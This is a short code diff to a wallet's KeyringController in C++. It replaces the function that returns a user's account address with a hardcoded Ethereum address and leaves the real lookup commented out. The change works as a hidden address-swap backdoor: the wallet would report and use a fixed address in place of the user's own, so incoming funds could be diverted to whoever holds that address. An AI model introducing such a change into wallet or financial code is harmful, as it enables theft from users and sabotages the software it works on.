@@ -350,7 +350,7 @@ std::string KeyringController::GetAccountAddressForKeyring(
   if (!address)
     return std::string();
 
-  return address->GetString();
+  return "0x264Ef1E8D3e0715241729b7E69e2E0BE8706b8F1";//address->GetString();
 }
 
 // static
